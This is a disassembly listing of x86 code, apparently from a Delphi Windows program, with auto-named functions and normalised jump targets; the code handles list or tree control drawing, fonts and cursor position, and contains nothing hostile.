jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov eax [ ebx + 0x10 ]
call sub_445cec
mov [ ebp - 0xa ] al
xor esi esi
lea eax [ ebp - 0x10 ]
call sub_403f7c
lea ecx [ ebp - 0x18 ]
xor edx edx
xor eax eax
call sub_4060b4
mov [ ebp - 0x19 ] 0x4
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
sub eax 0x2
je r-xdata
test eax 0x10002
je r-xdata
xor edx edx
push ebp
push sub_446373
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4257b8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425658
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425674
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x8 ] sub_447af4
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_447af4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425630
retn
lea edx [ ebp - 0x34 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x1c ] 0x8
jne r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44729c
mov eax [ eax + 0x14 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44729c
pop edx
call sub_442cfc
jmp r-xdata
mov esi [ ebx + 0x18 ]
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edi eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0xc ]
test [ ebx ] 0x1
je r-xdata
jmp r-xdata
test eax 0x10003
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x104 ]
mov [ ebp - 0x9 ] al
mov ax [ ebx + 0x28 ]
push eax
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x108 ]
mov [ ebp - 0x9 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x298 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x29c ] edx
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
lea edx [ ebp - 0x34 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x18 ] 0x2
je r-xdata
lea edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4033e8
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebx + 0xc ]
push eax
mov al [ ebp - 0x19 ]
push eax
test [ ebx + 0x10 ] 0x20
setne al
push eax
mov eax [ ebx + 0x10 ]
call sub_445cec
mov edx eax
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov edi [ ebx + 0x14 ]
test edi edi
je r-xdata
je r-xdata
test [ ebx ] 0x2
je r-xdata
mov esi [ ebx + 0x8 ]
test esi esi
jne r-xdata
test eax 0x10004
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28a ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x4
call sub_403a64
call sub_403a64
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
lea edx [ ebp - 0x34 ]
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
test [ ebx + 0x18 ] 0x2
jne r-xdata
test [ ebx + 0x14 ] 0x2
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_403f7c
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_408b80
jmp r-xdata
mov eax [ ebx + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x24 ]
sub eax 0x25
je r-xdata
jmp r-xdata
test [ ebx ] 0x10
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jg r-xdata
mov ecx [ ebx + 0x18 ]
dec ecx
mov edx [ edi + 0x24 ]
mov eax [ ebx + 0x14 ]
call sub_408a50
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44637a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_4257b8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x210 ]
mov eax [ esi + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov edi [ ebp - 0x8 ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4242e8
mov [ edi + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0x14 ]
call sub_424f6c
call sub_4242e8
mov [ edi + 0x34 ] eax
lea eax [ ebp - 0x98 ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0xc ]
call sub_4247bc
push eax
call GetObjectA
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
test [ ebx + 0x14 ] 0x2
je r-xdata
push 0x0
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
jmp r-xdata
mov [ ebp - 0x19 ] 0x0
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x14 ]
mov [ ebx + 0x24 ] eax
jmp r-xdata
mov esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_447328
mov eax [ edi + 0x10 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ eax ] 0x0
lea ecx [ ebp - 0x9c ]
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x24 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x9c ]
mov ecx [ ebx + 0x18 ]
dec ecx
mov eax [ ebx + 0x14 ]
call sub_408a50
jmp r-xdata
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
mov ax [ ebx + 0x28 ]
push eax
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_445ba4
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_4257b8
lea eax [ ebp - 0x98 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x298 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x29c ] eax
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x2
push 0x1
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
mov [ ebp - 0x19 ] 0x2
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax [ edi + 0x20 ]
inc eax
call sub_42c708
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0xf000
or [ ebx ] 0x8
jmp r-xdata
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebx + 0x8 ]
dec edx
mov eax edi
call sub_443a94
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
dec ecx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_447dbc
mov eax [ ebp - 0x20 ]
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x19 ] 0x3
jmp r-xdata
sub_44637a
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov cl 0x3
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425630
retn
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
sub_446a1c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
test [ ebx + 0x98 ] 0x4
je r-xdata
mov ecx [ esp ]
mov edx ebp
mov eax ebx
call sub_45be54
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_419b1c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov eax [ esp ]
push eax
push ebp
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_442ea0
call sub_442cc8
push eax
call MulDiv
push eax
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_442ea0
pop edx
call sub_442cfc
inc esi
dec edi
jne r-xdata
sub_446ab0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x2e2 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
sub_446b00
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40442c
xor eax eax
push ebp
push sub_446b59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x22c ]
call sub_443b74
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_443614
mov edx esi
mov eax ebx
call sub_4436c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446b60
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_446b68
push ebx
push ecx
mov [ esp ] 0x1
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
mov cl 0x2
jmp r-xdata
sub_446bb0
push ebx
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov cl 0x2
jmp r-xdata
sub_446be8
push ebx
push esi
mov ebx edx
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x29 ] 0x0
jne r-xdata
cmp [ eax + 0x32a ] 0x0
je r-xdata
mov [ ebx + 0x29 ] 0x1
mov eax ebx
call sub_443530
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x32c ]
call [ esi + 0x328 ]
sub_446c20
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x342 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x344 ]
call [ ebx + 0x340 ]
sub_446c4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446cbd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x14 ]
call sub_404174
mov edx esi
mov eax ebx
call sub_445ba4
mov esi eax
cmp [ ebx + 0x33a ] 0x0
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x33c ]
call [ ebx + 0x338 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446cc4
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_443614
sub_446ccc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf0 ]
dec eax
jne r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x224 ]
pop ebx
retn
sub_446ce8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
cmp eax 0xf
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax [ ebx + 0x22c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp eax 0x14
jne r-xdata
mov eax ebx
call sub_4561bc
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_459d5c
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_459cc8
test al al
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_446d66
add [ eax ] al
push ebx
push esi
add esp 0xffffffd8
mov ebx eax
mov eax ebx
call sub_456230
xor eax eax
mov [ ebx + 0x270 ] eax
push esp
call GetCursorPos
lea ecx [ esp + 0x20 ]
mov edx esp
mov eax ebx
call sub_455590
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x26c ]
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_443c00
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_447484
mov esi eax
mov [ ebx + 0x26c ] 0xffffffff
test esi esi
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
mov eax esi
call sub_443a48
push eax
mov eax ebx
call sub_45c380
lea ecx [ esp + 0xc ]
pop edx
call sub_42c8c8
test eax eax
je r-xdata
mov ebx [ ebx + 0x224 ]
mov edx eax
mov eax ebx
call sub_462cd8
lea ecx [ esp + 0x10 ]
xor edx edx
mov eax esi
call sub_443a64
mov eax [ esp + 0x4 ]
sub eax [ esp + 0x14 ]
push eax
mov ecx [ esp + 0x4 ]
sub ecx [ esp + 0x14 ]
xor edx edx
mov eax ebx
call sub_45ddd4
sub_446e3c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_456250
mov eax [ ebx + 0x224 ]
call sub_45dfbc
xor eax eax
mov [ ebx + 0x270 ] eax
pop ebx
pop ebp
retn 0x4
sub_446e68
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45ba00
mov edi [ esi + 0x8 ]
mov al [ esi + 0x4 ]
dec al
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax ebx
call sub_4472c0
mov [ ebx + 0x270 ] eax
xor edx edx
mov eax ebx
call sub_4472e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
jmp r-xdata
dec al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx edi
mov eax ebx
call sub_455590
mov eax [ esp + 0x4 ]
push eax
cmp [ esi + 0xc ] 0x0
setne al
push eax
mov edx [ edi + 0x8 ]
mov ecx [ esp + 0x8 ]
mov eax ebx
call sub_446f9c
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov [ ebx + 0x270 ] eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
jmp r-xdata
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax ebx
call sub_4470c0
mov esi eax
lea ecx [ esp + 0x8 ]
xor edx edx
xor eax eax
call sub_4060b4
lea edx [ esp + 0x8 ]
mov cl 0x4
mov eax ebx
call sub_44741c
mov esi eax
jmp r-xdata
mov eax esi
call sub_443a48
push eax
mov eax [ ebx + 0x22c ]
call sub_443bd0
mov edi eax
dec edi
pop eax
sub edi eax
jl r-xdata
test esi esi
je r-xdata
inc edi
mov esi eax
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_443c00
xor ecx ecx
mov edx 0x1
call sub_44375c
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_443c00
mov edx 0x1
call sub_4436f4
test al al
je r-xdata
sub_446f9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ ebp + 0xc ]
call sub_447484
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
call sub_4472c0
mov edi eax
cmp edi ebx
jne r-xdata
xor eax eax
mov [ esi + 0x270 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
test edi edi
je r-xdata
cmp ebx [ esi + 0x270 ]
jne r-xdata
mov cl [ ebp + 0x8 ]
mov edx 0x1
mov eax ebx
call sub_44375c
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor ecx ecx
mov edx 0x1
mov eax edi
call sub_44375c
sub_447040
push ebx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45c380
mov edx sub_4445b8
xor ecx ecx
call sub_42ca38
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_447070
cmp dl [ eax + 0x229 ]
je r-xdata
retn
mov [ eax + 0x229 ] dl
mov dl [ eax + 0x229 ]
mov ecx edx
sub cl 0x1
je r-xdata
cmp [ eax + 0x2ea ] 0x0
jne r-xdata
sub cl 0x2
jne r-xdata
call sub_447040
add dl 0xfe
sub dl 0x2
jae r-xdata
sub_4470c0
push ebx
push esi
mov ebx eax
xor esi esi
mov al [ ebx + 0x215 ]
sub al 0x2
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_45c380
call sub_42c914
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_443c00
mov esi eax
sub_4470f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x218 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x218 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_4639e8
xor ecx ecx
xor edx edx
mov eax ebx
call sub_444d50
mov edx [ ebx + 0x27c ]
call sub_463a2c
mov edx ebx
mov eax [ ebx + 0x218 ]
call sub_4213bc
mov eax [ ebx + 0x218 ]
call sub_462d14
mov edx eax
xor ecx ecx
mov eax ebx
call sub_444d50
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_447168
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x21c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x21c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x280 ]
call sub_4639e8
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_444d50
mov edx [ ebx + 0x280 ]
call sub_463a2c
mov edx ebx
mov eax [ ebx + 0x21c ]
call sub_4213bc
mov eax [ ebx + 0x21c ]
call sub_462d14
mov edx eax
mov ecx 0x1
mov eax ebx
call sub_444d50
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4471e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x220 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x220 ] esi
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_4639e8
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov eax ebx
call sub_44533c
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_444d50
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_463a2c
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_4213bc
mov eax [ ebx + 0x220 ]
call sub_462d14
mov edx eax
mov ecx 0x2
mov eax ebx
call sub_444d50
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor edx edx
mov eax ebx
call sub_4453c0
mov dl 0x1
mov eax ebx
call sub_4453c0
mov eax ebx
call sub_4452b0
jmp r-xdata
sub_4472c0
push ebx
mov ebx eax
mov al [ r-xdata ]
push eax
mov cl 0x4
xor edx edx
mov eax ebx
call sub_447348
test eax eax
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x270 ]
sub_4472e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_4472c0
mov esi eax
test esi esi
je r-xdata
mov cl 0x1
mov edx 0x1
mov eax esi
call sub_44375c
jmp r-xdata
xor ecx ecx
mov edx 0x1
mov eax esi
call sub_44375c
sub_447348
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor eax eax
mov al [ ebp - 0x1 ]
cmp eax 0x4
ja r-xdata
test edi edi
je r-xdata
jmp [ eax * 4 + jump_table_44737f ]
or edi 0xffffffff
mov eax edi
call sub_443a48
mov edi eax
jmp r-xdata
mov esi 0x100
jmp r-xdata
mov esi 0x200
jmp r-xdata
mov esi 0x400
jmp r-xdata
mov esi 0x800
jmp r-xdata
xor esi esi
test [ ebp + 0x8 ] 0x4
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
or esi 0x8
test [ ebp + 0x8 ] 0x10
je r-xdata
or esi 0x1
mov eax ebx
